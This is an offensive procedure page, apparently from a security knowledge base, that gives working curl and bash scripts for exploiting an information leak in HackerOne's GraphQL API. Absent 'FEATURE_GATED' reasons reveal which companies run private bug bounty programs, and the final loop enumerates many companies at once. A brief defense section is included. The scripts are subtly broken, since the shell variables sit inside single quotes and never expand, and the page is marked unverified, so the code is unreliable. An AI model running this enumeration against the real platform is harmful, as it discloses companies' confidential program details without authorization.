---
tags:
  - information-disclosure
  - graphql
  - hackerone
  - enumeration
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/query-hackerone-team-graphql]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Search Open Websites-Domains]]'
updated_at: '2025-12-14T17:25:53.576Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: ad52421f-c654-4019-833d-b3e23a6cac40
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Search Open Websites-Domains]]'
---
# Query-HackerOne-GraphQL-Team-Object

## Summary

This procedure queries HackerOne's GraphQL API to retrieve the 'i_cannot_create_jira_webhook_reasons' field from a Team object, exploiting inconsistent responses to disclose whether a company runs a private or public bug bounty program. The presence or absence of 'FEATURE_GATED' in the response array leaks program existence information.

## Description

HackerOne's GraphQL API at https://api.hackerone.com/graphql exposes the Team object's 'i_cannot_create_jira_webhook_reasons' field, which varies based on program type. For companies without programs, the field includes 'FEATURE_GATED'; for those with private or public programs, it does not. This differential allows attackers to enumerate sensitive program details by querying multiple teams. Requires a valid HackerOne API token for authentication. The attack targets the web-based HackerOne platform and relies on no proper sanitization of error reasons in responses.

## Requirements

1. Valid HackerOne account with API token (generate from profile settings)
2. curl or equivalent HTTP client for GraphQL POST requests
3. List of company handles to query (obtain from HackerOne directory)
4. Network access to https://api.hackerone.com/graphql

## Defense

Defensive measures and detection strategies:

- Implement consistent error responses in GraphQL API to avoid information leakage (e.g., always return the same array or sanitize fields)
- Enforce strict access controls on Team object fields, requiring program-specific permissions
- Monitor API query patterns for unusual volume of Team object requests targeting multiple companies
- Rate-limit GraphQL queries per user to prevent enumeration

## Objectives

1. Retrieve Team object data to observe response differences
2. Identify companies with private/public programs via missing 'FEATURE_GATED'
3. Enable broader enumeration of HackerOne program landscape

## Instructions

### Step 1: Authenticate and Prepare Query

**Context**: Set up authentication and define the GraphQL query for the Team object.

**Command** ([[commands/query-hackerone-team-graphql]]):

First, export your token:

```bash
export TOKEN="your_hackerone_api_token"
```

Then execute the query for a specific company:

```bash
COMPANY="target-company-handle"
curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"query":"query { team(handle: \"$COMPANY\") { i_cannot_create_jira_webhook_reasons } }"}' https://api.hackerone.com/graphql | jq '.'
```

> This sends a POST request to the GraphQL endpoint with the query. Use jq for pretty-printing JSON. Expected output is a JSON object with data.team.i_cannot_create_jira_webhook_reasons as an array. Check for 'FEATURE_GATED' presence.

### Step 2: Analyze Response for Disclosure

**Context**: Parse the response to determine program existence based on array contents.

**Command** ([[commands/query-hackerone-team-graphql]]):

For comparison, query another company and grep for the key indicator:

```bash
COMPANY="another-company-handle"
response=$(curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"query":"query { team(handle: \"$COMPANY\") { i_cannot_create_jira_webhook_reasons } }"}' https://api.hackerone.com/graphql)
if [[ $response == *"FEATURE_GATED"* ]]; then
  echo "No program detected"
else
  echo "Private or public program exists"
fi
```

> This checks if 'FEATURE_GATED' is absent, indicating a program. Scale by looping over multiple companies to enumerate.

### Step 3: Scale for Enumeration

**Context**: Automate queries across multiple companies to build an enumeration list.

Use a script incorporating [[commands/query-hackerone-team-graphql]]:

```bash
companies_file="companies.txt"  # One handle per line
while IFS= read -r company; do
  response=$(curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"query":"query { team(handle: \"$company\") { i_cannot_create_jira_webhook_reasons } }"}' https://api.hackerone.com/graphql)
  if [[ ! $response == *"FEATURE_GATED"* ]]; then
    echo "$company: Program detected" >> enumerated_programs.txt
  fi
done < "$companies_file"
```

> Outputs a file with companies having programs. Success if enumerated_programs.txt populates with valid handles.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Search Open Websites-Domains]]

### Sub-Techniques

- None

## Commands Used

- [[commands/query-hackerone-team-graphql]]

## Tools Used

- None

## Tags

- information-disclosure
- graphql
- api
- enumeration
- hackerone
